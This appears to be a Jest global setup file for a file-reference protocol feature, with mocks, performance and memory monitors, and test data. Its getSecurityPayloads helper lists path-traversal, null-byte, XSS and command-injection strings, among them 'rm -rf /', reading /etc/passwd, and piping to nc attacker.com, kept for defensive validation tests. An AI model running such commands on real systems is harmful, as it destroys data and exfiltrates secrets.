/**
 * Jest Test Setup for Feature 6: File Reference Protocol
 * Global test configuration and utilities for TDD workflow
 */

// Global test timeout for all tests
jest.setTimeout(30000);

// Mock console methods to reduce noise during tests
global.console = {
  ...console,
  // Keep error and warn for debugging
  log: jest.fn(),
  debug: jest.fn(),
  info: jest.fn(),
  warn: console.warn,
  error: console.error,
};

// Global test utilities
global.testUtils = {
  // Generate random file path for testing
  generateRandomPath: (prefix = '/test', suffix = '.js') => {
    const randomId = Math.random().toString(36).substring(7);
    return `${prefix}/file-${randomId}${suffix}`;
  },

  // Generate test file data
  generateFileData: (overrides = {}) => ({
    path: '/workspaces/project/src/test.js',
    exists: true,
    isFile: true,
    isDirectory: false,
    size: 1024,
    lastModified: new Date('2024-01-01'),
    permissions: {
      readable: true,
      writable: true,
      executable: false
    },
    ...overrides
  }),

  // Generate security test payloads
  getSecurityPayloads: () => ({
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      './legitimate/../../../etc/shadow'
    ],
    nullByteInjection: [
      'legitimate.txt\0../../../etc/passwd',
      'file.pdf\0.exe',
      'safe/path\0/dangerous/path'
    ],
    commandInjection: [
      'file.txt; rm -rf /',
      'file.txt && cat /etc/passwd',
      'file.txt | nc attacker.com 1234'
    ],
    scriptInjection: [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '"><script>alert(1)</script>'
    ]
  }),

  // Wait for async operations in tests
  waitFor: (ms) => new Promise(resolve => setTimeout(resolve, ms)),

  // Mock performance measurement
  measurePerformance: async (operation) => {
    const start = Date.now();
    await operation();
    const end = Date.now();
    return end - start;
  },

  // Generate large test data for performance tests
  generateLargeDataSet: (size) => Array.from({ length: size }, (_, i) => ({
    id: i,
    path: `/workspaces/project/file-${i}.js`,
    data: `test-data-${i}`.repeat(100)
  }))
};

// Global error handler for unhandled promises
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Don't exit the process during tests
});

// Mock fetch for integration tests
global.fetch = jest.fn(() =>
  Promise.resolve({
    ok: true,
    json: () => Promise.resolve({}),
    text: () => Promise.resolve(''),
  })
);

// Mock WebSocket for real-time tests
global.WebSocket = jest.fn(() => ({
  close: jest.fn(),
  send: jest.fn(),
  addEventListener: jest.fn(),
  removeEventListener: jest.fn(),
}));

// Test database for integration tests
global.mockDatabase = {
  files: new Map(),
  permissions: new Map(),
  auditLog: [],
  
  addFile: function(path, data) {
    this.files.set(path, data);
  },
  
  getFile: function(path) {
    return this.files.get(path);
  },
  
  hasFile: function(path) {
    return this.files.has(path);
  },
  
  setPermissions: function(path, permissions) {
    this.permissions.set(path, permissions);
  },
  
  getPermissions: function(path) {
    return this.permissions.get(path) || { readable: true, writable: true, executable: false };
  },
  
  logAuditEvent: function(event) {
    this.auditLog.push({
      ...event,
      timestamp: new Date().toISOString(),
      id: this.auditLog.length + 1
    });
  },
  
  getAuditLog: function() {
    return [...this.auditLog];
  },
  
  clear: function() {
    this.files.clear();
    this.permissions.clear();
    this.auditLog = [];
  }
};

// Reset mock database before each test
beforeEach(() => {
  global.mockDatabase.clear();
  
  // Reset all timers
  jest.clearAllTimers();
  
  // Reset all mocks
  jest.clearAllMocks();
});

// Performance monitoring
const performanceMetrics = {
  testTimes: [],
  slowTests: [],
  
  recordTest: function(testName, duration) {
    this.testTimes.push({ testName, duration });
    if (duration > 1000) { // Tests taking longer than 1 second
      this.slowTests.push({ testName, duration });
    }
  },
  
  getSlowTests: function() {
    return this.slowTests.slice().sort((a, b) => b.duration - a.duration);
  },
  
  getAverageTime: function() {
    if (this.testTimes.length === 0) return 0;
    const total = this.testTimes.reduce((sum, test) => sum + test.duration, 0);
    return total / this.testTimes.length;
  }
};

// Hook to measure test performance
beforeEach(() => {
  global.testStartTime = Date.now();
});

afterEach(() => {
  const duration = Date.now() - global.testStartTime;
  const testName = expect.getState().currentTestName || 'unknown';
  performanceMetrics.recordTest(testName, duration);
});

// Report slow tests after all tests complete
afterAll(() => {
  const slowTests = performanceMetrics.getSlowTests();
  if (slowTests.length > 0) {
    console.log('\n=== Performance Report ===');
    console.log(`Average test time: ${performanceMetrics.getAverageTime().toFixed(2)}ms`);
    console.log('\nSlow tests (>1000ms):');
    slowTests.forEach(test => {
      console.log(`  ${test.testName}: ${test.duration}ms`);
    });
  }
});

// Memory leak detection
const memoryUsage = [];

beforeAll(() => {
  if (global.gc) {
    global.gc();
  }
  memoryUsage.push(process.memoryUsage());
});

afterAll(() => {
  if (global.gc) {
    global.gc();
  }
  memoryUsage.push(process.memoryUsage());
  
  const initialMemory = memoryUsage[0];
  const finalMemory = memoryUsage[1];
  const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
  
  // Warn if memory usage increased significantly (>50MB)
  if (memoryIncrease > 50 * 1024 * 1024) {
    console.warn(`\n⚠️  High memory usage detected: ${(memoryIncrease / 1024 / 1024).toFixed(2)}MB increase`);
  }
});

// Global test data
global.testData = {
  validPaths: [
    '/workspaces/project/src/index.js',
    './relative/path/to/file.js',
    '../parent/path/to/file.js',
    'simple-file.js',
    'path/with-dashes/file.js',
    'path/with_underscores/file.js'
  ],
  
  invalidPaths: [
    '',
    null,
    undefined,
    '   ',
    'path/../../../etc/passwd',
    'path/with\nullbytes',
    'path/with<script>alert(1)</script>'
  ],
  
  mockResponses: {
    success: {
      success: true,
      path: '/test/path',
      exists: true,
      type: 'file',
      protocol: 'file-reference-v1',
      timestamp: new Date().toISOString()
    },
    
    error: {
      success: false,
      path: '/test/path',
      error: {
        message: 'Test error',
        code: 'TEST_ERROR',
        type: 'test_error'
      },
      protocol: 'file-reference-v1',
      timestamp: new Date().toISOString()
    }
  }
};